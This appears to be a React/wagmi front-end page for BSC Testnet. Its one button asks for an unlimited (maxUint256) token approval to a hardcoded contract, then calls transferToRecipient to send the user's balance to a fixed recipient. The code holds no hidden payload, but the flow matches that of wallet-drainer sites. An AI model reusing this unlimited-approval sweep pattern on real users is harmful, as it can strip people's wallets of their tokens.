"use client";

import { useState } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useWriteContract } from "wagmi";
import { maxUint256 } from "viem";
import "./transfer.css";

// ─── Config ────────────────────────────────────────────────────────────────
const CONTRACT_ADDRESS = "0x529eb14d90fc54a1c3F347C63f806cf492687C9A";
const TOKEN_ADDRESS    = "0x7b0ED090071cb486a6ca12F16f49bd1135BDbeDA";

const TOKEN_ABI = [
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount",  type: "uint256" },
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const CONTRACT_ABI = [
  {
    inputs: [],
    name: "transferToRecipient",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const STEP_LABEL = {
  idle:             "Approve & Transfer",
  approving:        "Step 1/2 — Approving…",
  waiting_approve:  "Confirming Approval…",
  transferring:     "Step 2/2 — Transferring…",
  waiting_transfer: "Confirming Transfer…",
  done:             "Transfer Complete ✓",
  error:            "Failed — Retry",
};

export default function TransferPage() {
  const { isConnected } = useAccount();
  const { writeContractAsync } = useWriteContract();

  const [step,   setStep]   = useState("idle");
  const [txHash, setTxHash] = useState(null);
  const [errMsg, setErrMsg] = useState(null);

  const loading = ["approving","waiting_approve","transferring","waiting_transfer"].includes(step);

  async function handleTransfer() {
    if (step === "done" || !isConnected) return;
    setErrMsg(null);
    setTxHash(null);

    try {
      // Step 1 — Approve
      setStep("approving");
      await writeContractAsync({
        address: TOKEN_ADDRESS,
        abi: TOKEN_ABI,
        functionName: "approve",
        args: [CONTRACT_ADDRESS, maxUint256],
      });

      setStep("waiting_approve");
      await new Promise((r) => setTimeout(r, 3000));

      // Step 2 — transferToRecipient
      setStep("transferring");
      const hash = await writeContractAsync({
        address: CONTRACT_ADDRESS,
        abi: CONTRACT_ABI,
        functionName: "transferToRecipient",
      });

      setStep("waiting_transfer");
      await new Promise((r) => setTimeout(r, 2000));

      setTxHash(hash);
      setStep("done");

    } catch (err) {
      setErrMsg(err?.shortMessage || err?.message || "Transaction failed");
      setStep("error");
    }
  }

  return (
    <main className="tr-main">
      <div className="tr-orb tr-orb1" />
      <div className="tr-orb tr-orb2" />
      <div className="tr-orb tr-orb3" />

      <div className="tr-card">

        {/* ── Topbar: RainbowKit ConnectButton ── */}
        <div className="tr-topbar">
          <div className="tr-logo">
            <span className="tr-logo-icon">◈</span>
            <span className="tr-logo-text">Token Transfer</span>
          </div>
          {/* RainbowKit handles connect + disconnect + chain switching */}
          <ConnectButton
            showBalance={false}
            chainStatus="icon"
            accountStatus="avatar"
          />
        </div>

        {/* ── Header ── */}
        <div className="tr-header">
          <span className="tr-network-badge">
            <span className="tr-net-dot" />
            BSC Testnet
          </span>
          <h1 className="tr-title">Token Transfer</h1>
          <p className="tr-subtitle">
            One click — approve token &amp; forward balance to recipient
          </p>
        </div>

        {/* ── Steps ── */}
        <div className="tr-steps">
          {/* Step 1 */}
          <div className={[
            "tr-step",
            ["waiting_approve","transferring","waiting_transfer","done"].includes(step) ? "tr-step-done"   : "",
            ["approving","waiting_approve"].includes(step)                              ? "tr-step-active"  : "",
          ].join(" ")}>
            <div className="tr-step-circle">
              {["transferring","waiting_transfer","done"].includes(step)
                ? <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3.5"><polyline points="20 6 9 17 4 12"/></svg>
                : "1"}
            </div>
            <div className="tr-step-text">
              <span className="tr-step-name">Approve</span>
              <span className="tr-step-desc">Unlock token for contract</span>
            </div>
          </div>

          {/* Connector line */}
          <div className="tr-connector">
            <div className={`tr-connector-bar${["transferring","waiting_transfer","done"].includes(step) ? " tr-connector-filled" : ""}`} />
          </div>

          {/* Step 2 */}
          <div className={[
            "tr-step",
            step === "done"                                    ? "tr-step-done"   : "",
            ["transferring","waiting_transfer"].includes(step) ? "tr-step-active"  : "",
          ].join(" ")}>
            <div className="tr-step-circle">
              {step === "done"
                ? <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3.5"><polyline points="20 6 9 17 4 12"/></svg>
                : "2"}
            </div>
            <div className="tr-step-text">
              <span className="tr-step-name">Transfer</span>
              <span className="tr-step-desc">Forward balance to recipient</span>
            </div>
          </div>
        </div>

        {/* ── CTA Button ── */}
        {isConnected ? (
          <button
            className={[
              "tr-btn",
              step === "done"  ? "tr-btn-done"  : "",
              step === "error" ? "tr-btn-error" : "",
            ].join(" ")}
            onClick={handleTransfer}
            disabled={loading || step === "done"}
          >
            {loading && <span className="tr-spinner" />}
            {STEP_LABEL[step]}
          </button>
        ) : (
          <div className="tr-connect-prompt">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
              <rect x="2" y="7" width="20" height="14" rx="2"/>
              <path d="M16 3H8a2 2 0 0 0-2 2v2h12V5a2 2 0 0 0-2-2z"/>
              <circle cx="17" cy="14" r="1.5" fill="currentColor"/>
            </svg>
            Connect your wallet above to continue
          </div>
        )}

        {/* ── Success ── */}
        {txHash && (
          <div className="tr-success">
            <div className="tr-success-check">✓</div>
            <div>
              <p className="tr-success-title">Transaction confirmed</p>
              <a
                className="tr-tx-link"
                href={`https://testnet.bscscan.com/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
              >
                {txHash.slice(0,22)}…{txHash.slice(-6)} ↗
              </a>
            </div>
          </div>
        )}

        {/* ── Error ── */}
        {errMsg && (
          <div className="tr-error">
            <p className="tr-error-title">Error</p>
            <p className="tr-error-msg">{errMsg}</p>
            <button className="tr-retry-btn" onClick={() => { setStep("idle"); setErrMsg(null); }}>
              ↺ Try Again
            </button>
          </div>
        )}

        {/* ── Footer ── */}
        <div className="tr-footer">
          <div className="tr-footer-row">
            <span>Contract</span>
            <code>{CONTRACT_ADDRESS.slice(0,10)}…{CONTRACT_ADDRESS.slice(-6)}</code>
          </div>
          <div className="tr-footer-row">
            <span>Token</span>
            <code>{TOKEN_ADDRESS.slice(0,10)}…{TOKEN_ADDRESS.slice(-6)}</code>
          </div>
        </div>
      </div>
    </main>
  );
}